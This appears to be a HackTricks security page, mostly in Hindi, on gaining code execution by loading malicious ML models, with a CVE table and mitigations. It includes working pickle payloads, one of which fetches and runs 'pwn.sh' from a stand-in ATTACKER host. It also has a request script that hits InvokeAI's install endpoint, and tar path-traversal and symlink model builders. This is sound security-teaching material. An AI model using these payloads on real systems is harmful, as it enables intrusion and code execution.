# मॉडल्स RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models आमतौर पर विभिन्न फॉर्मैट्स में साझा किए जाते हैं, जैसे ONNX, TensorFlow, PyTorch, आदि। इन models को developers की मशीनों या production systems में उपयोग के लिए लोड किया जा सकता है। आम तौर पर models में malicious code नहीं होना चाहिए, पर कुछ मामलों में model कोระบบ पर arbitrary code execute करने के लिए इस्तेमाल किया जा सकता है — या तो यह intended feature है या model loading library में किसी vulnerability के कारण।

At the time of the writting ये कुछ उदाहरण हैं इस तरह की vulnerabilities के:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | दुर्भावनापूर्ण pickle मॉडल checkpoint में होने से code execution (बायपास करते हुए `weights_only` safeguard)                               | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download से code execution; management API में Java deserialization RCE                                         | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint `load_model_trainer_states_from_checkpoint` के दौरान pickle reducer ट्रिगर करता है → ML worker में code execution | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML से model लोड करना `yaml.unsafe_load` का उपयोग करता है (code exec) <br> Lambda layer के साथ model लोड करने पर arbitrary Python code चलता है | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model integer overflow ट्रिगर करता है → heap corruption (संभावित RCE)                                                | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` से model लोड करने पर attacker के `__reduce__` payload के साथ pickle execute हो जाता है                                    | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default में pickled object arrays की अनुमति देता है – malicious `.npy/.npz` code exec ट्रिगर कर सकते हैं                   | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model की external-weights path directory से बाहर निकल सकती है (arbitrary files पढ़ना) <br> Malicious ONNX model tar arbitrary files ओवरराइट कर सकता है (जिससे RCE हो सकता है) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator वाले model को attacker की native code लोड करने की आवश्यकता हो सकती है; complex model graphs logic का दुरुपयोग करके unintended computations करा सकते हैं | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` enabled के साथ model-load API का उपयोग करने पर relative path traversal से files लिखने की अनुमति मिल जाती है (उदा., `.bashrc` ओवरराइट कर RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model फाइल parser में heap buffer overflows कराती है, जिससे प्रभावित सिस्टम पर arbitrary code execution संभव होता है   | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model जिसमें Lambda layer का code हो अभी भी load पर चलता है (Keras safe_mode पुराने फॉर्मेट को कवर नहीं करता – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | कई ML tools (उदा., pickle-based model formats, Python `pickle.load`) model फाइलों में embedded arbitrary code को execute कर देंगे जब तक mitigations न हों | |

इसके अलावा, कुछ python pickle based models हैं जैसे कि [PyTorch](https://github.com/pytorch/pytorch/security) में उपयोग होने वाले, जिन्हें `weights_only=True` के साथ लोड न किए जाने पर सिस्टम पर arbitrary code execute करने के लिए इस्तेमाल किया जा सकता है। इसलिए, कोई भी pickle based model इस तरह के attacks के प्रति विशेष रूप से संवेदनशील हो सकता है, भले ही वे ऊपर की तालिका में सूचीबद्ध न हों।

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` एक लोकप्रिय open-source web interface है Stable-Diffusion के लिए। Versions **5.3.1 – 5.4.2** REST endpoint `/api/v2/models/install` expose करते हैं जो users को arbitrary URLs से models download और load करने की अनुमति देता है।

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
जब प्रदान की गई फ़ाइल एक **PyTorch checkpoint (`*.ckpt`)** होती है, `torch.load` एक **pickle deserialization** करता है। क्योंकि सामग्री सीधे user-controlled URL से आती है, एक attacker checkpoint के अंदर custom `__reduce__` method वाला एक malicious object embed कर सकता है; यह method **during deserialization** चलायी जाती है, जिससे InvokeAI server पर **remote code execution (RCE)** हो जाता है।

इस vulnerability को **CVE-2024-12029** आवंटित किया गया था (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. एक malicious checkpoint बनाएं:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. अपने नियंत्रण में HTTP सर्वर पर `payload.ckpt` होस्ट करें (उदा. `http://ATTACKER/payload.ckpt`).
3. कमजोर endpoint को ट्रिगर करें (कोई authentication आवश्यक नहीं):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. जब InvokeAI फ़ाइल डाउनलोड करता है तो यह `torch.load()` को कॉल करता है → `os.system` gadget चल जाता है और हमलावर InvokeAI प्रक्रिया के संदर्भ में कोड निष्पादन प्राप्त कर लेता है।

तैयार exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरा फ्लो ऑटोमेट करता है।

#### शर्तें

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` हमलावर द्वारा पहुँच योग्य होना चाहिए  
•  प्रक्रिया के पास shell commands निष्पादित करने की अनुमति हो

#### निवारण

* Upgrade to **InvokeAI ≥ 5.4.3** – यह पैच डिफ़ॉल्ट रूप से `scan=True` सेट करता है और deserialization से पहले मालवेयर स्कैनिंग करता है।  
* जब प्रोग्रामैटिक रूप से checkpoints लोड कर रहे हों तो `torch.load(file, weights_only=True)` या नया [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper उपयोग करें।  
* मॉडल स्रोतों के लिए allow-lists / signatures लागू करें और सेवा को न्यूनतम अनुमतियों के साथ चलाएँ।

> ⚠️ ध्यान रखें कि **कोई भी** Python pickle-आधारित फ़ॉर्मेट (जिनमें कई `.pt`, `.pkl`, `.ckpt`, `.pth` फाइलें शामिल हैं) अनविश्वसनीय स्रोतों से deserialization करने के लिए स्वाभाविक रूप से असुरक्षित है।

---

यदि आपको पुराने InvokeAI संस्करणों को reverse proxy के पीछे चलाते हुए रखना ही हो तो एक ad-hoc निवारण का उदाहरण:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE असुरक्षित `torch.load` के माध्यम से (CVE-2025-23298)

NVIDIA’s Transformers4Rec (part of Merlin) ने एक असुरक्षित checkpoint loader उजागर किया जो उपयोगकर्ता-प्रदान किए गए paths पर सीधे `torch.load()` को कॉल करता था। क्योंकि `torch.load` Python `pickle` पर निर्भर करता है, एक attacker-controlled checkpoint deserialization के दौरान reducer के माध्यम से arbitrary code चला सकता है।

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

क्यों यह RCE में बदलता है: Python `pickle` में, एक object एक reducer (`__reduce__`/`__setstate__`) परिभाषित कर सकता है जो एक callable और उसके arguments लौटाता है। यह callable unpickling के दौरान execute होता है। यदि ऐसा object किसी checkpoint में मौजूद है, तो यह किसी भी weights के उपयोग से पहले चल जाता है।

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
डिलिवरी वेक्टर और ब्लास्ट रेडियस:
- Trojanized checkpoints/models जो repos, buckets, या artifact registries के माध्यम से साझा किए जाते हैं
- Automated resume/deploy pipelines जो checkpoints को auto-load कर देती हैं
- निष्पादन training/inference workers के अंदर होता है, अक्सर elevated privileges के साथ (उदा., containers में root)

समाधान: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने सीधे `torch.load()` को एक restricted, allow-listed deserializer से बदल दिया जो `transformers4rec/utils/serialization.py` में implement किया गया है। नया loader types/fields को validate करता है और load के दौरान arbitrary callables के invoke होने को रोकता है।

PyTorch checkpoints के लिए रक्षात्मक मार्गदर्शन:
- अविश्वसनीय डेटा को unpickle न करें। संभव हो तो non-executable formats जैसे [Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX को प्राथमिकता दें।
- यदि आपको PyTorch serialization का उपयोग करना ही पड़े, तो सुनिश्चित करें `weights_only=True` (नए PyTorch में supported) या Transformers4Rec patch जैसी allow-listed unpickler का उपयोग करें।
- model provenance/signatures को लागू करें और sandbox deserialization को सक्षम करें (seccomp/AppArmor; non-root user; restricted FS और कोई network egress न हो)।
- checkpoint load के समय ML services से होने वाले अनपेक्षित child processes के लिए monitor करें; `torch.load()`/`pickle` उपयोग को trace करें।

POC और vulnerable/patch संदर्भ:
- पैच से पहले vulnerable loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- पोस्ट-पैच loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## उदाहरण – एक malicious PyTorch model तैयार करना

- मॉडल बनाएं:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- मॉडल लोड करें:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## मॉडलों से Path Traversal

जैसा कि [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में बताया गया है, विभिन्न AI frameworks द्वारा उपयोग किए जाने वाले अधिकांश मॉडल फ़ॉर्मैट आर्काइव्स पर आधारित होते हैं, आमतौर पर `.zip`। इसलिए, इन फ़ॉर्मैट्स का दुरुपयोग करके path traversal attacks किए जा सकते हैं, जिससे उस सिस्टम की मनमानी फ़ाइलें पढ़ी जा सकती हैं जहाँ मॉडल लोड किया जाता है।

उदाहरण के लिए, निम्नलिखित कोड से आप ऐसा मॉडल बना सकते हैं जो लोड होते ही `/tmp` डायरेक्टरी में एक फ़ाइल बनाएगा:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
या, निम्नलिखित कोड के साथ आप एक मॉडल बना सकते हैं जो लोड होने पर `/tmp` डायरेक्टरी के लिए एक symlink बनाएगा:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### गहराई से: Keras .keras deserialization and gadget hunting

यदि आप .keras internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import issue, और allowlist के भीतर post-fix gadget discovery पर केंद्रित मार्गदर्शिका चाहते हैं, तो देखें:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## संदर्भ

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
